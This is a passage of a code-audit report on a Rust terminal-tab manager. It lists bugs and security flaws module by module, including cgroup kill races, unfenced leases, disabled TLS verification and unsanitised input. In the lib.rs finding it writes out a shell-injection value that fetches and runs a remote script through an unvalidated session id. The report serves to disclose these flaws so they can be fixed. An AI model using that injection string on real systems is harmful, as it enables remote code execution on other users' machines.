differently from the user's own; briefs.rs:245-248 for_cwd re-runs both read_dirs and re-reads+re-parses every .md on every call, i.e. once per tab at session start, with no caching and no per-file size limit

### `src/cgroup.rs`

cgroup.rs:320-332 terminate_tab feeds the pids straight from cgroup.procs into kill(1) with NO guard, while parse_cgroup_procs deliberately KEEPS a 0 line — the modules own test asserts it (:431 parse_cgroup_procs("0\\n-1\\n2a\\n3") == [0, 3]) with the comment "the callers guards handle 0", but terminate_tab is a caller and never calls unsafe_tab_pid: kill -s TERM 0 signals the CALLERS ENTIRE PROCESS GROUP, i.e. the daemon and every tab, and this runs on the ordinary tab-close path (headless.rs:1192); a 1 line would likewise be forwarded; cgroup.rs:343-365 reap_stale_tabs SIGKILLs every tab-* cgroup under the delegated base at startup with no ownership check at all — no pid/boot/instance marker, nothing that distinguishes "left over from a prior run" from "belongs to the instance that is running right now", so a systemd restart that overlaps with the outgoing process, or any second daemon resolving the same delegated base, atomically kills the other ones live tab subtrees; cgroup.rs:96-131 setup() mutates whatever cgroup the process happens to be in, with no check that it is actually our own delegated unit subtree — it creates supervisor/, moves the process into it and writes +memory/+cpu/+pids into that parents cgroup.subtree_control; the GUI calls this too (app.rs:932), so a desktop binary launched from a terminal does this to the TERMINALS scope, where other processes still sit directly in the cgroup and the no-internal-processes rule makes the subtree_control write fail (silently, since every write is let _ =) — limits then appear enabled while no controller is actually delegated; cgroup.rs:126-128+120 the controller enables are ignored individually AND collectively, so init logs "per-tab resource limits enabled" and returns Some(base) even when not one controller could be turned on: every later memory.max/cpu.max/pids.max write fails silently at :158-166 and the tab is unlimited while the daemon reports success; cgroup.rs:381-392 sanitize_id maps every non [A-Za-z0-9_-] char to _, so two distinct tab ids can resolve to the SAME tab-<id> directory — and kill_tab/cgroup.kill on one then SIGKILLs the other tabs entire subtree; nothing validates the id as a uuid; cgroup.rs:138-177 vs 262-266 apply() returns early when limits.is_empty(), so for a limitless tab only ensure_tab creates the cgroup — but ensure_tab is gated not(feature="gui"), meaning the GUI never puts a limitless tab in a cgroup at all; the doc at :253-261 ("EVERY tab gets its own cgroup ... so its whole process subtree can be reliably torn down") is true only for the headless build, and the GUI keeps exactly the orphan problem the comment describes; cgroup.rs:89-92 init ignores the OnceLock::set result and takes a wanted flag no caller ever passes false (headless.rs:886, app.rs:932 both pass true) — the gate is dead API, and because the first set wins, a later init can never turn limiting on if the first one resolved None; cgroup.rs:105-113 the writability probe creates tab-atelier.probe and removes it best-effort, so a crash between the two leaves a stray cgroup that reap_stale_tabs will not clean (it only matches tab-*); cgroup.rs:276-286 kill_tab returns whether the cgroup.kill WRITE succeeded, not whether anything died, and it removes the dir immediately — the code comments acknowledge the rmdir race but the boolean is still used by callers as "the tab was killed"

### `src/claims.rs`

claims.rs:221-224 a claims.json that is truncated or unparsable is swallowed by .ok()/unwrap_or_default(), silently resetting the WHOLE lease table and next_fence to 0 — that directly breaks the invariant stated at 87-88 (fences must never repeat), because post-reset fence 1 compares equal to a pre-crash fence 1 held by a stalled agent; claims.rs:241 the persist is a plain std::fs::write with no temp+rename, so a crash or a concurrent reader mid-write is exactly how that truncated file gets produced, and the write error is discarded (let _ =) so a read-only state dir means fences silently replay from 1 on the next restart — the comment at 239-240 frames this as merely 'leases work in memory', which understates it; claims.rs:19-21 vs 118-149 the headline fencing is never actually enforced anywhere in this module — neither grant nor release takes a fence argument, both compare only the opaque caller-supplied holder string (passed straight through from the request in api/claims_route.rs:36), so two tabs that share a name, or one that spoofs holder, defeat mutual exclusion outright; claims.rs:191/197 PATH_OVERRIDE uses if-let-Ok / .ok() while REGISTRY at 219 uses PoisonError::into_inner, so on a poisoned lock set_registry_path silently no-ops and registry_path falls back to the REAL state dir — a test would then write to the developer's ~/.local/state, the one thing the doc at 188-189 promises cannot happen; claims.rs:182+220 set_registry_path does not invalidate the cached REGISTRY, which is loaded once per process, so calling it after any with_registry leaves the old contents loaded and then persists them to the new path; every caller must pair it with reset_for_test, which is #[cfg(test)]-only, so the 'ops override' half of the doc at 184-185 has no working path; claims.rs:132 a renewal overwrites granted_ms with now, so original acquisition time is unrecoverable after the first refresh and a watchdog looking for a stuck holder only ever sees a freshly-granted claim; claims.rs:145 release requires live_at, so a holder whose lease lapsed but whose key nobody retook cannot release its own stale entry and it lingers until the next gc — release returns false where the caller reasonably expects true (cli/work.rs:173 discards it); claims.rs:228-229 gc() runs before the 'before' snapshot, so a pure-read call gcs in memory but is never persisted and on-disk claims.json accumulates lapsed entries until some unrelated mutation rewrites it; claims.rs:219 with_registry always takes the RwLock in WRITE mode plus a full deep clone of the registry for change detection, even for read-only closures (api/fleet_route.rs:38, api.rs:1888 both just call active()), so listing serialises against every grant; claims.rs:212-218 the same three-line comment is pasted twice; tests cover Registry in isolation only — the entire I/O half (182-251: load, corrupt-file handling, persist, path override) has no test, and the reload test at 388 round-trips serde in memory rather than through the file

### `src/cli/backlog.rs`

backlog.rs:277-288 there is no rotation: the doc at :247-248 and the CoveragePolicy field at :217 both promise 'a rotation of audits over the largest ones', but the code sorts every file by size and takes the top `audit_largest` deterministically on every sweep — the same two files are proposed forever, and once they cool out of the 30-day window they come straight back, so every file below the top N is audited never; backlog.rs:277 that audit list is also built from `files.iter()` unfiltered, ignoring min_lines and every coverage filter, so a generated or vendored file that was deliberately excluded from cov: tasks is still put up for audit; backlog.rs:191-201 the cooldown is keyed off `t.last_ts` — the timestamp of the LAST note of any kind on the task, not of the completion — so any later note (a bid, a stray award, a comment) on a finished task pushes last_ts forward and re-extends the cooldown; a task that keeps attracting chatter can never be re-announced even though it finished a month ago; backlog.rs:141-162 parse_lcov silently discards a trailing SF: record that has no `end_of_record` (a truncated or in-progress report loses its last file), and both the LF:/LH: parses at :150+:154 swallow failures — a malformed `LF:` line leaves lines_found at 0, percent() then returns 100.0 by design (:111-113), and the file is treated as perfectly covered and never announced; a coverage report corrupted mid-write silently shrinks the backlog instead of erroring; backlog.rs:85-96 run_source calls Command::output() with no timeout and no output limit: a source that hangs (a pipeline waiting on stdin, a network fetch) blocks the whole sweep indefinitely, and one that streams (`yes`) buffers unbounded stdout into memory — this is the timer-driven path, so neither failure mode is recoverable without killing the daemon; backlog.rs:381+389 --target parses as f64 with no validation and `\"NaN\"\"\"/\"inf\"/negative all parse successfully: with --target NaN the `f.percent() < target` filter at :172 is false for every file and lines_to's cast yields 0, so the command exits 0 having announced nothing, reporting a healthy no-op instead of a bad argument; --limit and --audit-largest are likewise unbounded usizes; backlog.rs:242-245 relative_to falls back to the raw path whenever strip_prefix fails — a --root given with a trailing slash, through a symlink, or containing `..` silently produces absolute task ids, which is exactly the cross-checkout duplication the function's own doc (:236-240) says it exists to prevent, and nothing warns; backlog.rs:448-477 the exit code conflates outcomes: `i32::from(had_error)` returns 1 for 'one source broke but everything else was announced' and :473 returns the same 1 for 'the blackboard write failed', while :473 also bails mid-batch leaving a partially-announced board with no summary of which ids landed; backlog.rs:364-367 the unknown-flag check runs only at :390, AFTER value() has already consumed the following argument, so a stray token in the last position is reported as '<token> expects a value' rather than 'unknown argument', and a misplaced --dry-run after --from is swallowed as part of the shell command; backlog.rs:55-74 candidate ids are never validated: a source emitting an id that begins with '-' (easy from an `rg`/`sed` pipeline) announces a task that `tab-atelier done <id>` then parses as a flag, and run_source's from_utf8_lossy at :95 turns non-UTF8 bytes into replacement chars, so the 'stable across runs' id contract at :40-42 quietly breaks

### `src/cli/brain.rs`

brain.rs:696-715 the TICK_BUDGET check sits AFTER the fetch-error 'continue' at :699, so every failed /output fetch skips the budget test entirely — with N dead or unreachable tabs a tick runs N x 3s (the share_link agent timeout) instead of the advertised 4s, blowing straight past the 5s poll interval the budget exists to protect; brain.rs:771-791 all the nudge bookkeeping (nudged_hash, nudge_streak, last_label, next_nudge_at) is committed BEFORE the POST, and the POST propagates with ?, so a send that fails — daemon restarting, tab locked (423), tab closed (404) — still burns a backoff step and marks the screen as already-nudged: the tab then waits up to 900s for a continue it never received, and the single failure aborts the whole tick for every other tab too; brain.rs:723+713 the circuit breaker counts entries in 'eligible', but 'eligible' is itself truncated by TICK_BUDGET — on a large fleet the scan stops early, capped can never exceed CIRCUIT_BREAKER_THRESHOLD=5, and the breaker never engages in exactly the big-fleet outage it was written for; brain.rs:485-487 the AgentError trigger fires with no pattern at all, and agent_state is set by set-status from INSIDE the tab's PTY, so anything the agent runs can flag its own tab and get continue\\r typed into it; nothing ever clears agent_state, so a dead tab stuck at 'error' is nudged forever — the nudged_hash guard only blocks an UNCHANGED screen, and each nudge changes the screen, re-arming eligibility; brain.rs:176-180 'Internal server error', and likewise ECONNRESET / ETIMEDOUT / 'Connection refused', are generic strings that appear routinely in build logs, HTTP traces and test output the agent is merely READING. The claude-only filter at :651-659 is justified in its own comment by precisely this hazard ('git log showing ECONNRESET') but only excludes non-Claude tabs — a Claude tab running git log has the identical problem, completely unmitigated; brain.rs:262-277 scan_output returns the first entry in PATTERNS order, not the latest occurrence in the text, so a stale generic 'Internal server error' earlier in the tail outranks a fresher, more specific '529 Overloaded' later in it — which then mislabels the episode and spuriously resets the backoff streak as the tail scrolls; brain.rs:112-126 probe_once accepts ANY 2xx as online, which inverts captive-portal detection: a portal's 200 login page is the exact signal that traffic is being intercepted, and Google's generate_204 endpoint means what it says — accepting 200 makes brain believe a portal-trapped box is online and burn backoff steps for the duration; brain.rs:816-824 crash_log never creates the parent directory (OpenOptions::create makes files, not dirs), so on a fresh install the crash log silently writes nothing in exactly the early-crash case it exists for; it also hardcodes the literal "tab-atelier" rather than crate::APP_DIR, and has no size cap — a per-tick panic (the broken-pipe println the comment names is itself a panic) loops forever appending unboundedly; brain.rs:427-432+680 has_cached is !cached_tail.is_empty(), so a tab whose output is legitimately empty never counts as cached and is re-fetched in full every tick, defeating the CRC optimisation for the cheapest tabs; brain.rs:704-709 the eligibility hash is captured during a scan that may run seconds before the send at :786, with no CRC re-check — an agent that recovered on its own in that window gets a spurious continue\\r injected mid-turn; brain.rs:491-494 recovery resets nudge_streak/last_label but never nudged_hash, so a tab that recovers and later returns to the byte-identical screen it was once nudged at is permanently ineligible; brain.rs:915-916 --once returns 0 unconditionally, even when the tick returned Err or panicked, so the scriptable entry point can never report failure

### `src/cli/brief.rs`

9 findings, no code changed (full text in note --topic audit): worst is brief.rs:45,58 — --cwd is never made absolute, so 'brief --cwd .' matches no baseDir and prints a false 'no project brief matches' with exit 0, the exact failure the command exists to disprove; also --cwd swallows the next flag, --list ignores MAX_TOTAL so it lists briefs render() drops, an always:true brief lists as 'baseDir []' (reads as a parse failure), --json claims to be the hook's exact payload but skips should_brief, assembly is duplicated from claude_hook.rs:201-207 instead of briefs::for_cwd, is_dir() mislabels unreadable dirs, empty-cwd fallback, and --list/--json/matching-brief are untested

### `src/cli/dispatch.rs`

6 findings: 'shared client table' invariant broken (client::dispatch has 0 callers; list/ports aliases + bench-lag -n now unreachable; limit_cli/run_cli dead in prod; module docs in dispatch.rs+client.rs both list the wrong clap-native set); 17 subcommands print internal 'cli::work::tasks' paths as --help; set-font advertises a positional form clap rejects; note msg equal to --topic/--from eaten by downstream reparser; schedule/set-font/resize doc claims not clap-enforced; to_string_lossy corrupts non-UTF-8 paths on add/handoff

### `src/cli/logging.rs`

cli/logging.rs:55-58 'log off' only deletes the persisted file, but resolve_log_filter (lib.rs:1035-1038) prefers TAB_ATELIER_LOG then RUST_LOG over it — so on any machine with RUST_LOG exported (i.e. most Rust dev boxes) 'GUI logging disabled' is printed while logging stays fully ON; neither the off nor the set path checks the env the way status() does; cli/logging.rs:74 same asymmetry on the enable side: it prints "GUI logging enabled: filter 'X'" unconditionally, but if either env var is set the GUI will use THAT filter, not X, so the confirmation names a value that will never take effect; cli/logging.rs:65-74 an empty or whitespace-only argument (tab-atelier log '' or log '   ') is not a preset, so it is persisted verbatim, lib.rs:1069 trims it to an empty file, and resolve_log_filter's .filter(|s| !s.is_empty()) at lib.rs:1040 then reads that as OFF — the command reports 'enabled' for an action that disables logging; cli/logging.rs:72 the filter is never validated before being persisted: env_logger's parse_filters (lib.rs:1022) silently skips directives it cannot parse, so a typo like 'tab_atelier=inof' is stored, reported as success, and enables nothing at the next launch — round-tripping through env_logger::filter::Builder::try_parse before writing is the cheap fix; cli/logging.rs:90-94 status() re-implements the precedence from lib.rs:1035-1038 with different primitives — var_os().is_some() here vs var().ok() there — so a non-UTF-8 TAB_ATELIER_LOG makes resolve_log_filter fall through to RUST_LOG/persisted while status confidently reports 'source: env TAB_ATELIER_LOG'; two copies of the same precedence rule that already disagree; cli/logging.rs:97 'GUI logging: ON' is aspirational — init_gui_file_logging (lib.rs:1017) silently returns when the log file cannot be opened and log_ring::install can lose the race with an already-installed logger, so status reports ON and prints a 'Log file:' path that may not exist and may never be written; cli/logging.rs:51+55 extra arguments after status/show/off are silently ignored (log off whatever succeeds), so a mistyped invocation looks like it did what was asked; lib.rs:1069 the persist is a bare std::fs::write with no temp+rename, so a crash mid-write leaves a truncated filter string that resolve_log_filter will happily hand to parse_filters; cli/logging.rs has no tests at all — the whole exit-code contract (0 vs 1) and the preset table are uncovered

### `src/cli/remote/files.rs`

cli/remote/files.rs:91+170 both put and get build the ureq agent with disable_verification(true), so the actual transfer — which carries the bearer token via crate::remote::authorized and the file bytes — runs over completely unauthenticated TLS; the TOFU pin is advisory only: warn_if_cert_drifted (resolver.rs:86-104) prints to stderr and returns, never fails the command, silently returns when cert_sha256 is empty or the host is momentarily unreachable, and it checks the fingerprint over its OWN separate connection (fetch_cert_fingerprint), so even a matching pin says nothing about the connection that then ships the token — any on-path attacker on the LAN gets both the credential and the file with at most a warning line the user can miss; cli/remote/files.rs:105-109 put treats ANY Ok response as success: read_json().unwrap_or_default() turns a non-JSON body into null, path falls back to '?', and it still prints '✓ uploaded N bytes → ?' and returns 0 — a captive portal or reverse proxy answering 200 with HTML is indistinguishable from a real upload; cli/remote/files.rs:202 get writes with std::fs::write, which truncates an existing local file with no prompt, no --force and no temp+rename — 'remote get host notes.md' silently destroys ./notes.md, and because the write happens unconditionally a 200-with-empty-body replaces the local file with 0 bytes and still reports '✓ downloaded 0 bytes'; cli/remote/files.rs:29-36+125-132 every option consumes the next argv element via args.get(i).cloned() with no check that it exists or that it is not itself a flag: a trailing '--tab' silently becomes None and falls back to the remote's ACTIVE tab (a different tab than the user named), a trailing '--remote-name' silently falls back to the local basename, and 'get ... -o --tab foo' happily uses '--tab' as the output filename — all of these should be exit 2, none are; cli/remote/files.rs:37 vs :133 the two commands disagree on what counts as an unknown flag (put rejects only '--*', get also rejects 2-char '-x'), so malformed flags leak into the positional list in different ways per subcommand; cli/remote/files.rs:20+86+166 timeout_global(30s) bounds the WHOLE request including body transfer, so any file large enough or link slow enough to exceed 30s fails with no resume and, for put, no way to know whether the server already committed the partial write; cli/remote/files.rs:61 put reads the entire file into memory with std::fs::read and no size cap before it has even resolved the tab, and :182 read_to_vec sets no explicit limit on what a misbehaving remote can stream back; cli/remote/files.rs:85-95 and :165-175 are an identical 11-line agent-construction block (and :27-44/:123-140 near-identical parse loops), so the TLS policy is written twice and can drift between the two commands; cli/remote/files.rs:216 resolve_tab_index spawns a full remote Client thread purely to map a name to an index and just drops it, leaving the thread's shutdown to Client's Drop; cli/remote/files.rs:206 the stdout flush is issued BEFORE the println! it is presumably meant to flush; no tests in this file at all

### `src/cli/set_context.rs`

set_context.rs:75-92 the text is sent completely unsanitised — no length cap, no control-character strip — while the sibling set-meta path runs crate::sanitize_meta which explicitly filters control chars because "they would corrupt a header line or a log"; the server (api/tab_props.rs:128-130) only truncates to 2000 chars and trims, so an in-tab agent can store ESC sequences in a tab context that the human then renders by running tab-atelier tabs in their own terminal, and newlines break the one-line tooltip/listing contract the module doc describes; set_context.rs:98-111 the response body is discarded and any 2xx prints ✓ tab context set, but the server ANSWERS with the value it actually stored — a whitespace-only or over-2000-char string comes back as {"context":null} (a CLEAR) while the CLI still reports it as set, and the same blindness hides that the write is only QUEUED (pending_context_changes) rather than applied; set_context.rs:112-115 the error arm prints the bare ureq error, so a 404 tab-not-found from the API reaches the user as an opaque "http status: 404" with no hint that the --tab id was wrong; api/tab_props.rs:112-125 (reached only through this CLI) a body that fails to parse, or a context field that is not a string, is silently treated as a CLEAR instead of a 400 — a garbled request wipes the tab context rather than failing; set_context.rs:31+72-77 --clear silently beats supplied text: set-context "PR #3719" --clear clears and discards the argument with no warning; set_context.rs:51 the positional filter only rejects arguments starting with two dashes, so a single-dash argument is silently absorbed into the context text, and there is no -- end-of-options marker for text that legitimately starts with dashes; set_context.rs:32-38 --tab consumes whatever follows with no leading-dash check, so set-context --tab --clear takes "--clear" as the tab id and then fails at the API with a 404; set_context.rs:93 tab_id is interpolated into the URL path with no uuid validation and no percent-encoding, so a slash or query character in --tab reshapes the request path; set_context.rs:75 parts.join(" ") flattens the positionals, so shell quoting and multiple spaces are not preserved; set_context.rs:65-70 outside a tab the command exits 0 having printed nothing at all — deliberate for hooks, but it makes a real success and a silently-dropped write indistinguishable to any script that checks only the exit code; set_context.rs:94-97 the 2s global timeout turns a busy daemon into exit 1 even though the POST may have been accepted and queued

### `src/cli/set_font.rs`

set_font.rs:75+82 the doc claims load-modify-save "preserving the other settings", but crate::load_preferences (lib.rs:3460-3474) swallows every parse error with .ok()? and returns Preferences::default() — so running set-font against a preferences.json with one syntax error, or one field the current build cannot deserialize, silently loads DEFAULTS and then overwrites the file: every other setting is destroyed, including the plaintext remote_endpoint bearer tokens lib.rs:3511 documents as living there, with no backup and a cheerful ✓ printed; set_font.rs:82 uses save_preferences (lib.rs:3476-3483: plain fs::write, no tmp+rename, no .bak rotation, no 0600) although save_preferences_at (lib.rs:3507-3522) exists and does all three for exactly this file — so a crash or ENOSPC mid-write truncates preferences.json (producing the corruption the previous finding then acts on), and when no user file exists yet the create happens at umask default 0644 while load_preferences has just fallen back to SYSTEM_PREFERENCES_PATH, meaning set-font can copy the system-wide prefs and any tokens in them into a NEW world-readable per-user file; set_font.rs:75 that same system-file fallback means the first set-font on a machine with system prefs silently forks a full private copy — later admin-side changes stop reaching that user, with nothing said; set_font.rs:82-90 save_preferences returns unit and swallows its own IO error, so on a read-only or full home the command prints "✓ font set" and exits 0 having written nothing — the CLI has no way to report the one failure that matters; set_font.rs:36 the range check (0, 200] admits absurd small values: --size 0.0001 is accepted and lands in the GUI as the cell metric, where a near-zero cell width makes the column count blow up (width/cell) — the lower bound needs to be a real minimum, not just non-zero; set_font.rs:25-26 --font takes the next argument whatever it is, with no leading-dash check, so set-font --font --size 16 silently sets the family to the literal "--size" and then errors on 16 as unexpected; set_font.rs:58 conversely a positional family is only accepted when it does not start with a dash and there is no -- end-of-options marker, so a family beginning with a dash cannot be set at all; set_font.rs:84-88 the confirmation reads the MERGED prefs, so set-font --size 18 prints family=<previously stored value> as though the family had just been set; set_font.rs:74-82 nothing validates that the family exists — the stated purpose is fixing a badly-spaced font, yet a typo writes happily and the user only discovers it after the relog the tool tells them to do

### `src/cli/set_meta.rs`

set_meta.rs:107-120 the ✓ is printed for ANY non-error response but the API only QUEUES the change (api/meta.rs:62-64 responds 200 "queued"), and the deferred apply in lib.rs:1509-1512 silently drops it when the map is at META_MAX_KEYS and the key is new — the enqueue-time full check at api/meta.rs:55 races against other producers, so set-meta can report success for a label that never lands; set_meta.rs:121-124 the error arm prints the bare ureq error, so a 400 from the API loses the server body — "meta is full (N keys)" or the exact validation reason never reaches the user, they get only "http status: 400"; cli/brain.rs:119 does this right by reading .status() and the body; set_meta.rs:74+100 sanitize_meta is called for validation and its normalised VALUE is thrown away (Ok((k, _))), then the RAW joined value is sent — the daemon re-sanitises, so a value containing control chars or surrounding whitespace is stored altered while the CLI prints ✓ for what the user typed; set_meta.rs:30+74 --clear silently beats a value: set-meta role reviewer --clear clears the key and the value argument is discarded with no warning, and the same combination makes the local validation run against the dummy "x" so the real value is never checked; set_meta.rs:108 tab_override goes into the URL path unvalidated and unencoded — no uuid parse, no percent-encoding — so --tab with a slash or a query char reshapes the request path and produces a confusing 404 instead of "not a tab id"; set_meta.rs:55-59 there is no -- end-of-options marker and any positional starting with two dashes is rejected as an unknown argument, so a value like --draft cannot be set at all; set_meta.rs:68 rest.join(" ") flattens multiple positionals into a single space-separated string, so shell quoting is not preserved: set-meta k a "" b stores "a  b"; set_meta.rs:84-89 outside a tab the command returns 0 with NO output at all — success and silently-dropped are indistinguishable to a calling script, which matters more here than for set-status because meta is the orchestration layer state; set_meta.rs:103-106 a 2s global timeout means a busy daemon yields exit 1 while the POST may well have been queued — the failure is not safely retryable-as-idempotent for a caller that then falls back to a different value

### `src/cli/set_status.rs`

set_status.rs:38-49 value-taking flags (--label/--session/--kind) silently accept a MISSING value (args.get(i).cloned()=None, no error) and happily swallow the next flag as their value: `set-status idle --label --plan` sets label="--plan" and drops --plan, exit 0; set_status.rs:17-26 missing API_URL/API_TOKEN exits 0 even when _TAB_ID IS set, so a broken in-tab hook config is indistinguishable from running outside a tab — the doc comment only justifies the no-op for the outside case; set_status.rs:93 tab_id from env is interpolated into the URL path unencoded, and the server (api/status.rs:19) slices by prefix/suffix so any '/' or '?' in _TAB_ID retargets the request path; set_status.rs:74-90 vs api/status.rs:39-62 — state 'idle' takes an early-return branch that DISCARDS sessionId/agentKind/planMode/daemon, yet the CLI accepts and sends them and gets 200 {cleared:true}; a Stop-hook doing `idle --session <uuid> --kind claude` never registers the session and gets no warning; set_status.rs:53 --daemon is one-way — daemon is only inserted when true and there is no --no-daemon, so a tab can never be un-marked daemon (asymmetric with --plan/--no-plan which does send false); set_status.rs:56 positional guard is !starts_with("--") so a single-dash typo like -idle is taken as the state and forwarded, turning a usage error into an opaque ureq 400 (exit 1); no client-side validation of state against idle|thinking|waiting|error despite the usage line listing them; env-triple + 15-line ureq POST boilerplate is copy-pasted verbatim in set_meta.rs:104 and set_context.rs:95 — one shared helper would keep timeout/auth/error-exit behaviour from drifting apart

### `src/cli/work.rs`

work.rs:151-176 done() never checks the caller holds the lease or that the task even exists — any agent can post a Done note for another agent's in-flight task id (or a typo'd id, which fold_tasks then materialises as a phantom Done task), and the release at :173 is fired with whoami() as holder and swallowed by `let _`, so a rejected holder-mismatch release is indistinguishable from a real one; work.rs:164-174 that swallowed release is the only cleanup path: if the home host is unreachable or the daemon errors, the lease stays parked for the full TTL and nothing is printed — the exact opposite of take()'s :394-395 policy that an unreachable home 'must never be silent'; work.rs:371+396 `ttl_s * 1000` is an unchecked u64 multiply on a value parsed straight from --ttl with no upper bound: `--ttl 18446744073709552000` panics in debug and wraps in release into a tiny lease, and `--ttl 0` is accepted outright and mints a lease that has already expired, so take() prints '(leased … for 0s)' and returns 0 while the task is instantly free for the next agent; work.rs:228-241 take_claim's doc promises the holder's name ('their name is printed by the caller') but it returns the hardcoded literal "held" for every 409, and take()'s :389 `Ok(Some(_)) => {}` discards even that — a collision is silent, so an operator watching take() skip tasks cannot tell who holds them; work.rs:394-401 the away-fallback path swallows a genuine local transport failure: `matches!(take_claim(..), Ok(None))` treats Err the same as a 409 and `continue`s, so a dead local daemon reached via an away task exits 3 ('nothing free') instead of the 1 that the identical failure produces at :403 for a local task; work.rs:375-378 the award note that makes the lease visible to other agents is appended with `let _ = append_entry(n)` — a blackboard write failure leaves the lease held but the board showing Open, and take() still prints success and returns 0, so the board and the lease table diverge with no signal; work.rs:49-53 identity_from's `.or(tab_id)` short-circuits on a *present but blank* TAB_ATELIER_AGENT: the blank Some wins the `or`, trim+filter then drops it, and a perfectly good $_TAB_ID is skipped in favour of `cli@origin` — the :430 test only covers blank-override-with-no-tab-id, so this shadowing is untested; work.rs:156-157 done() strips `--fail` from ANY position, including inside the result text, so `done t1 \"build broke on --fail handling\"` silently records the wrong message and, worse, flips the task to Failed — a result mentioning the flag changes the recorded outcome; work.rs:110-127 bid() puts no lower bound on --cost (i64), so a negative bid wins every auction — the same defect the :583-585 test claims to guard against by rejecting a missing cost — and a repeated --cost silently keeps the last one while unrecognised flags fall through into the note text; work.rs:180-196+260-262 tasks() and fleet() silently ignore unknown arguments (`tasks --json` prints the text form and exits 0) while take() at :339-342 rejects them with exit 2 — the same typo is fatal in one verb and invisible in another

### `src/event_proxy.rs`

event_proxy.rs:97 the `_ => return` catch-all silently swallows the OTHER reply-bearing alacritty events — `TextAreaSizeRequest(formatter)` (CSI 14t/16t pixel-size queries) and `ClipboardLoad(_, formatter)` (OSC 52) both hand over a formatter whose answer must travel back into the PTY, exactly like ColorRequest — so those queries hang and time out, reproducing for them the precise failure (:10-13) this module exists to fix; event_proxy.rs:55+62+69+99 every lock uses `if let Ok(..)`, so a single poisoning silently and permanently disables the proxy: set_notifier becomes a no-op and send_event stops forwarding PtyWrite for the rest of the process life, with no log, no counter, no recovery — the crate's own convention elsewhere is unwrap_or_else(PoisonError::into_inner), which keeps working; event_proxy.rs:93-94 vs :99 the poisoning policy is inconsistent inside one function: a poisoned theme/bg_override degrades gracefully to defaults and still answers, while a poisoned notifier drops the answer entirely — the same fault produces a wrong-colour reply on one path and total silence on the other; event_proxy.rs:99-103 the notifier Mutex is held ACROSS `sender.send()`; the guard from `self.notifier.lock()` is alive for the whole `if let` body, so a slow or full channel blocks every other thread trying to set_notifier or emit a reply behind a lock that is only meant to guard a slot assignment; event_proxy.rs:102 `let _ = sender.send(..)` discards the send result: a closed or full channel drops a DSR/DA reply with no signal at all, which is indistinguishable at the far end from the no-op default impl the module was written to replace — the caller waiting on the probe just times out; event_proxy.rs:14-15+54-58 the doc claims dropping events before set_notifier 'is fine because no PTY exists to read them yet', but the notifier is installed only after EventLoop::spawn returns and that same event loop is what runs the child — a shell that emits ESC[6n in its first prompt (reedline, starship) can land in the gap and its reply is dropped forever, with nothing to retry it; event_proxy.rs:30+37-38+93 EventProxy derives Default, so `theme` starts at ThemeName::default() until TerminalView::set_theme lands: a colour query answered in that startup window returns the DEFAULT palette rather than the tab's, and apps cache the bg they are told once — producing exactly the highlight clash described at :39-43, just at startup instead of on a theme change; event_proxy.rs:80-83 ChildExit(_) throws the exit status away and only sets a bool, discarding at its single point of availability the one piece of information a tab manager needs to distinguish a clean shell exit from a crash; event_proxy.rs:50 `exited` is the only pub field while every other piece of state has a private setter, so any holder of a clone can store(false) and silently un-exit a dead tab

### `src/http3.rs`

http3.rs:141+94 the send and receive paths disagree on the frame limit: read_frame REJECTS any length over MAX_FRAME_BYTES (2 MiB) as an error, but pump_output frames r.since(offset) with NO cap — the very first frame of a connection with since=0 carries the whole PtyRing (scrollback runs to ~10k rows), so the peer's read_frame errors out and kills the stream; the same happens any time a build or a cat produces >2 MiB between two notifications. The producer must chunk to MAX_FRAME_BYTES; http3.rs:61-68 frame() is pub, takes any payload and casts body_len to u32 with no check, so a >4 GiB payload silently truncates the length header and desynchronises the stream — the only guard lives on the read side; http3.rs:118-147 pump_output has no exit path other than a write error, and it parks on notified.await while the tab is quiet — a client that disconnects mid-silence leaves the task, the SendStream and the ring's Notify registration alive indefinitely; the doc at 110 says 'runs until the stream errors', but a quiet stream never errors; http3.rs:118+135 the caller-supplied 'since' offset is passed straight to PtyRing::since, which clamps to base_offset (pty_ring.rs:387) — if the requested offset has already been evicted from the ring the client silently receives a GAP with no marker and no way to detect it, which defeats the point of a byte-offset resume; http3.rs:72-81+98-100 a mid-frame EOF is indistinguishable from a clean close: read_exact returns Ok(false) both for a genuine end-of-stream and for a peer that died after sending the 4-byte length header, and read_frame turns that into Ok(None) = graceful end; a truncated frame should be an error. Treating Some(0) as EOF (line 76) has the same hazard if wtransport ever yields a zero-length chunk without closing; http3.rs:185-200 run_echo accepts unlimited concurrent sessions with NO authentication — unlike every other surface in this crate, which is token-gated — and echoes attacker-supplied bytes back; bound to anything but loopback that is a UDP reflector, and read_exact (72-81) has no read timeout, so a peer dribbling one byte at a time pins a task plus its buffer for free; http3.rs:202-214 handle_session echoes streams SEQUENTIALLY — accept_bi() is not called again until the current stream ends, so a client that opens a second bidi stream is stalled until the first finishes; http3.rs:163-175 cert_hash_hex returns an EMPTY STRING on an empty chain instead of Option/Result, so the failure propagates silently into whatever builds the serverCertificateHashes value and surfaces much later as an opaque browser connect failure; http3.rs:230 vs 163 the round-trip test pins the cert using wtransport's own .hash() and never calls cert_hash_hex — the only coverage of the production hash function is the 64-hex-chars shape assertion at 286-291, so if cert_hash_hex hashed the wrong bytes every test would still pass; http3.rs:22-23+155-157 the doc records that the cert must be <=14 days valid but nothing rotates it — a daemon running longer than that serves an expired cert whose pinned hash browsers refuse, with no renewal path in this module; http3.rs:102 body.split_off(1) allocates and copies the entire payload once per frame purely to strip the leading tag byte

### `src/lib.rs`

lib.rs:810-825+874-883+958-989 COMMAND INJECTION via agent_session_id: build_agent_resume_command interpolates session_id raw into "claude --resume {id}" / "catbus-agent --resume {id}", wrap_exec_command puts that straight into the bash -c script (it shell-quotes the tracer path, the log path and the proctitle with agent_probe::sh_squote right beside it, but never the command), and api/status.rs:72-75 accepts sessionId as an arbitrary string with ZERO validation — no uuid parse, no charset gate — then persists it as TabState::agent_session_id; on the next respawn headless.rs:552 execs bash -i -c "...exec claude --resume <id>", so a sessionId of "x; curl http://h/p | sh" runs arbitrary shell, and the typed path (headless.rs:692/950) reproduces it by typing the same string into the shell; every tab gets TAB_ATELIER_API_URL+TOKEN in its env and the route takes the TARGET tab id from the path, so any process in any tab can plant this on ANY OTHER tab and get code execution outside its own net confinement; lib.rs:1190-1196+785-804 TabState::agent_daemon documents that it is "set by the daemon itself at startup, so an unrecognised agent_kind alone never becomes a command line", but api/status.rs:76-81 takes both agentKind and daemon straight from the request body — so an in-tab caller can mark any tab as a daemon with any lowercase verb and make restore run our own binary with that subcommand (is_daemon_kind only excludes catbus/claude, so tab-atelier take / sweep / other stateful verbs are reachable); the charset gate bounds the damage but the 